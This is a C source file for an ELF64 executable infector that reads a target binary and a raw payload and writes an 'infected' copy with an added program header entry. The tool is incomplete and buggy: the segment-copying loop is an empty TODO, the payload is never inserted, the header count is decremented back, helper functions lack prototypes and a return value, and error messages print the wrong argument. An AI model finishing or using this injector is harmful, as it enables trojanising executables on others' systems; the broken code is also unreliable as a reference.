#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <elf.h>

//what kind of elfs are we dealinth with yo?
//yay polymorphism via macros!
#define ELFN(x) Elf64_ ## x

char usage[] = 
"usage: %s target payload result\n\
\n\
Note: payload must be in flat binary format.\n\
";

int main(int argc, char *argv[]){
  if( argc != 4 ){
    printf(usage, argv[0]);
    return 1;
  }

  void *target;
  off_t targetSize;
  void *infected;
  off_t infectedSize;
  void *payload;
  off_t payloadSize;
  int i;
  ELFN(Phdr) *programHeader;
  ELFN(Shdr) *sectionHeader;

  if( readFile(argv[1], &target, &targetSize) != 0 ){
    fprintf(stderr, "Could not open file '%s'\n", argv[1]);
    return -1;
  }
  if( readFile(argv[2], &payload, &payloadSize) != 0 ){
    fprintf(stderr, "Could not open file '%s'\n", argv[1]);
    return -1;
  }

  ELFN(Ehdr) *targetElfHeader = target;
  ELFN(Phdr) *targetProgramHeaderTable = target + targetElfHeader->e_phoff;
  ELFN(Shdr) *targetSectionHeaderTable = target + targetElfHeader->e_shoff;

  //allocate space for the new program header table and the payload
  infectedSize = targetSize + payloadSize + targetElfHeader->e_phentsize;
  if( (infected = malloc(infectedSize)) == 0 ){
    fprintf(stderr, "Unable to allocate memory for the infected binary.\nI hate my life.\n");
  }

  //find the string table
  ELFN(Shdr) *targetStringTable = targetSectionHeaderTable + targetElfHeader->e_shstrndx;
  char* targetStringTableValues = target + targetStringTable->sh_offset;

  //copy over the elf header
  ELFN(Ehdr) *infectedElfHeader = infected;
  memcpy(infectedElfHeader, targetElfHeader, sizeof(ELFN(Ehdr)));

  //add a new entry in the program header table
  infectedElfHeader->e_phnum++;
  infectedElfHeader->e_shoff = infectedSize - (infectedElfHeader->e_shnum*infectedElfHeader->e_shentsize); //adjust offset for the new header and payload

  //copy over the program header table
  ELFN(Phdr) *infectedProgramHeaderTable = infected + infectedElfHeader->e_phoff;
  memcpy(infectedProgramHeaderTable, targetProgramHeaderTable, targetElfHeader->e_phnum*targetElfHeader->e_phentsize);

  //copy over the section header table
  ELFN(Shdr) *infectedSectionHeaderTable = infected + infectedElfHeader->e_shoff;
  memcpy(infectedSectionHeaderTable, targetSectionHeaderTable, targetElfHeader->e_shnum*targetElfHeader->e_shentsize);

  //TODO copy over each segment and section
  //flags for which sections have been copied in a segment
  //0 is did not copy, 1 is did copy
  char *copiedSections = calloc(targetElfHeader->e_shnum, 1);
  for(i = 0, programHeader = targetProgramHeaderTable ;
      i < targetElfHeader->e_phnum ;
      i++, programHeader++ ){
  }
   
  infectedElfHeader->e_phnum--;


  //write out the newly infected file
  if( writeFile(argv[3], infected, infectedSize) != 0){
    fprintf(stderr, "Could not save the infected file to '%s'. You got the perms?\n", argv[2]);
    return -1;
  }

  return 0;
}

//assigns buffer and size to the size and location on the heap of the files contents
//returns 0 on success, -1 on failure
int readFile(char *path, void **buffer, off_t *size){
  //get the file size
  struct stat fileInfo;
  if( stat(path, &fileInfo) != 0 ){
    return -1;
  }
  //allocate some space on the heap
  *size = fileInfo.st_size;
  if( (*buffer = malloc(fileInfo.st_size)) == 0){
    return -1;
  }
  //read in the file
  FILE *fp;
  if( (fp = fopen(path, "r")) == 0 ){
    free(*buffer);
    return -1;
  }
  fread(*buffer, 1, *size, fp);
  fclose(fp);

  return 0;
}

int writeFile(char *path, void *buffer, off_t size){
  FILE *fp;
  if( (fp = fopen(path, "w")) == 0 ){
    return -1;
  }
  fwrite(buffer, 1, size, fp);
  fclose(fp);
}

